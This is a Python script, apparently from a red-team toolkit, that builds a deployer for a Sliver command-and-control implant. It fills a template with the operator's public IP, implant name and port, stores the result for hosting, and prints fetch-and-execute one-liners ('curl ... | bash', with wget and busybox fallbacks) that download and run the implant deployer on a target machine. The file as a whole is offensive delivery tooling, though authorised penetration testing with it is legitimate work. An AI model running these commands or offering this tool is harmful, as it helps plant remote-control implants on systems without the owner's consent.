#!/usr/bin/env python3

from common import *
import argparse
import urllib.request
import random
import os
import sys

# Path Setup

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(SCRIPT_DIR)
DEPLOY_DIR = os.path.join(ROOT_DIR, "server", "deploy")
DEFAULT_TEMPLATE = os.path.join(SCRIPT_DIR, "template.sh")

# Helpers

def generate_outfile_name() -> str:
	return ''.join(random.choices('0123456789abcdef', k=5))

def load_script(path: str) -> str:
	with open(path, "r") as f:
		return f.read()

def save_script(data: str, path: str) -> None:
	with open(path, "w") as f:
		f.write(data)

def pull_ip() -> str:
	return urllib.request.urlopen("https://checkip.amazonaws.com").read().decode().strip()

# Main

def main() -> None:
	parser = argparse.ArgumentParser(
		description="Generate a simple quick Sliver implant deployer."
	)

	parser.add_argument("--implant", "-i", required=True, help="Implant name")
	parser.add_argument("--template", "-t", default=DEFAULT_TEMPLATE, help="Template file")
	parser.add_argument("--host", "-H", default=pull_ip(), help="Remote Host")
	parser.add_argument("--port", "-p", default="8000", help="Remote Port")

	args = parser.parse_args()

	template_path = args.template
	if not os.path.isabs(template_path):
		template_path = os.path.join(SCRIPT_DIR, template_path)

	if not os.path.exists(template_path):
		failed(f"Template does not exist: {template_path}")
		sys.exit(1)

	os.makedirs(DEPLOY_DIR, exist_ok=True)

	info(f"Loading template ({template_path})")

	deploy_script = (
		load_script(template_path)
		.replace("<IP>", args.host)
		.replace("<IMPLANT>", args.implant)
		.replace("<PORT>", args.port)
	)

	file_name = generate_outfile_name()
	full_outpath = os.path.join(DEPLOY_DIR, file_name)

	save_script(deploy_script, full_outpath)
	success(f"Output saved at: {full_outpath}")

	url = f"http://{args.host}:{args.port}/deploy/{file_name}"

	success(f"timeout 60 curl -sSL {url}|bash")
	success(
		"(command -v curl >/dev/null 2>&1 && curl -fsSL {0} | bash) || "
		"(command -v wget >/dev/null 2>&1 && wget -qO- {0} | bash) || "
		"(busybox wget -qO- {0} | bash)".format(url)
	)

	info("Done.")

if __name__ == '__main__':
	main()

